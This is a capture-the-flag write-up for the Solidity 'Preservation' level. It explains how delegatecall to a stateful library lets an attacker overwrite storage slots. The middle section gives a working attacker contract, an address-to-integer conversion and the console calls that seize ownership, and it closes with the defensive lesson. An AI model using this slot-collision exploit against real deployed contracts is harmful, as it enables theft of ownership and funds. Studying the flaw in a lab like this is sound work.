# 16. Preservation
Difficulty 8/10

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

-   Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
-   Understanding what it means for `delegatecall` to be context-preserving.
-   Understanding how storage variables are stored and accessed.
-   Understanding how casting works between different data types.

*Notes*
- Messing around in remix: notice setSecondTime controls timeZone1Library
- This works in instance too (`await contract.setSecondTime(0)` -> `await contract.timeZone1Library()
'0x0000000000000000000000000000000000000000'`)
- https://blog.sigmaprime.io/solidity-security.html#delegatecall

LibraryContract storage slot[0] is storedTime, but slot[0] in Preservation is timeZone1Library  

Using setSecondTime, we can control the address of timeZone1Library and exploit context-preserving nature of delegatecall to change owner address. An attack contract was created:

preservation_attack.sol
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// Simple library contract to set the time
contract preservationAttack {

    uint storageSlot0; // corresponds to timeZone1Library
    uint storageSlot1; // corresponds to timeZone2Library
    address storageSlot2; //corresponds to owner

    // fallback - this will run if a specified function is not found
    fallback() external {
        storageSlot2 = [player address]; // set player address to owner
    }
}
```

This contract was deployed and then python was used to get the address as an int:
```
$ python3
Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.     >>> int('0xf51a72Ea6538AD7502C50Ec635A2C13E9e2496Fc',16)                   1399292568788218874132286441883746303772671121148
```

Then setSecondTime() is called with this input:
`await contract.setSecondTime("1399292568788218874132286441883746303772671121148")`

Finally, setFirstTime() can be called with any input since it now points to the attack contract:
`await contract.setFirstTime(0)`

**END**
As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.